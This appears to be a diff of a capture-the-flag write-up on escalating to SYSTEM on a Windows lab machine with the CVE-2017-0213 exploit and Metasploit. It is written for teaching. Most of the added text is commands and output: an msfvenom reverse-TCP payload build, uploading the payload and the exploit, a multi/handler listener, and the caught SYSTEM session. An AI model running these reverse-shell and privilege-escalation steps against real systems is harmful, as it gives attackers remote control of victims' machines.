@@ -70,12 +70,68 @@ meterpreter > execute kingpin.exe
 The exploit is finishing the execution and indeed elevates the privileges to Administrator. The problem is that is spawns a new shell, this can be verified by ```meterpreter> screenshot```.
 ![Sick shell](https://i.imgur.com/nr5Zi5C.jpg
  "Sick shell")
+### Solution
+ Compiling c++ with Win SDK on Linux is painful, so you can just grab a modified exploit which executes ```venomrs.exe``` from [this fork](https://github.com/leolashkevych/Exploits/tree/master/CVE-2017-0213) of the exploit.
 
- Compiling c++ with Win SDK on linux is painful, maybe some easier options are available.
+ Making a meterpeter reverse shell
+ ```
+ root@kingpin:~# msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.14.195 lport=6666 -f exe -o venomrs.exe
+ No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+ No Arch selected, selecting Arch: x64 from the payload
+ No encoder or badchars specified, outputting raw payload
+ Payload size: 205379 bytes
+ Final size of exe file: 211968 bytes
+ Saved as: venomrs.exe
+ ```
 
-### ms16_032
+ Uploading modified exploit and reverse shell
+ ```
+ meterpreter > upload /root/Downloads/exploit-x64.exe kingpin.exe
+ [*] uploading  : /root/Downloads/exploit-x64.exe -> kingpin.exe
+ [*] uploaded   : /root/Downloads/exploit-x64.exe -> kingpin.exe
+ meterpreter > upload /root/venomrs.exe venomrs.exe
+ [*] uploading  : /root/venomrs.exe -> venomrs.exe
+ [*] uploaded   : /root/venomrs.exe -> venomrs.exe
+ meterpreter > background
+ [*] Backgrounding session 2...
+ ```
+ Launch a multi handler to catch a connection
+ ```
+msf exploit(rejetto_hfs_exec) > use exploit/multi/handler
+msf exploit(handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf exploit(handler) > show options
+msf exploit(handler) > set lport 6666
+lport => 6666
+msf exploit(handler) > set lhost 10.10.14.195
+lhost => 10.10.14.195
+msf exploit(handler) > exploit
+[*] Exploit running as background job 0.
 
-First, migrate the current shell to a 64-bit process (Important!)
+[*] Started reverse TCP handler on 10.10.14.195:6666
+ ```
+Lastly, go back to the session to execute the exploit.
+
+```
+meterpreter > execute -f kingpin.exe
+Process 1492 created.
+[*] Sending stage (205379 bytes) to 10.10.10.8
+[*] Meterpreter session 3 opened (10.10.14.195:6666 -> 10.10.10.8:49661) at 2017-10-29 17:02:28 -0400
+```
+Navigate to a new session and check the user :)
+```
+meterpreter > background
+[*] Backgrounding session 2...
+msf exploit(handler) > sessions -i 3
+[*] Starting interaction with 3...
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+### Alternative solution
+
+There is an way around it without creating an executable with reverse shell. First, migrate the current shell to a 64-bit process (Important!)
 
 Switch to writable directory (e.g. Desktop) and background the session.
 Select ```ms16_032_secondary_logon_handle_privesc``` from exploit/windows/local. Set the target to Windows x64, then set the payload to 64-bit meterpeter.
